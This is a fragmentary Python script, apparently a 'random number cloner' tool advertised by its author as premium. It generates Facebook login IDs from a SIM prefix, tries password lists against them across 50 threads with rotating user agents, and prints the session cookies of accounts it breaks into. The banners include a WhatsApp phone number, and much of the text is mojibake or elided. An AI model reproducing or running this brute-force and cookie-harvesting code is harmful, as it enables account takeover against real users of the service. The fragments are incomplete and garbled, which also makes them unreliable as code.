...
def banner():
    ...
    print("[=] Ã°Å¸ËœÅ’ Testing New mathod By JUBU")
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; Nokia XR20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36537.36"}
...
def menu_apikey():
 ...
 |_____/ \__,_|_|_|\_\___/  |_|  |_|\__,_|_|\_\___|_|   
    ...
    â”‚ [âœ“] AUTHOR   : Saiko Haker ðŸ˜ˆ         â”‚

    â”‚ [âœ“] GITHUB   : JUBU the NOOB ðŸ’—       â”‚

    â”‚ [âœ“] TYPE     : PRIMIUM,$              â”‚

    â”‚ [âœ“] WHATSAPP : +8801834292903         â”‚

    â”‚ [âœ“] VERSION  :  2.0                   â”‚

    â”‚ [âœ“] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37mâ”‚
...
logo=(f"""\x1b[1;97m
 ...
 |_____/ \__,_|_|_|\_\___/  |_|  |_|\__,_|_|\_\___|_|   ðŸ˜ˆ
    ...
    â”‚ [âœ“] GITHUB   : JUBU the NOOB          â”‚

    â”‚ [âœ“] TYPE     : PRIMIUM. $             â”‚

    â”‚ [âœ“] WHATSAPP : +88018********         â”‚
...
def virus3():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(' [â¤ï¸â€ðŸ”¥]  Total ids:\033[1;92m '+tl)

		print(f' [â¤ï¸â€ðŸ”¥]  Usaragents : '+str(len(ugen)))

		print(f' [â¤ï¸â€ðŸ”¥]\033[1;97m  target sim code :\033[1;92m {kode} ')

		print(f"\033[1;97m [â¤ï¸â€ðŸ”¥]  version:\033[1;92m {doamin}")

		print(' \033[1;97m[â¤ï¸â€ðŸ”¥]  The process has been started')

		print(' [â¤ï¸â€ðŸ”¥]  use airplane mode if ok ids not come ')
...
def a(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJUBU1Ã—1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
...
:pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [â™¥] COOKIE : '+coki)
...
:pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [ðŸª] COOKIE : '+coki)
...
:pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\33[1;92m [ðŸ”¢] Numer : {uid}')
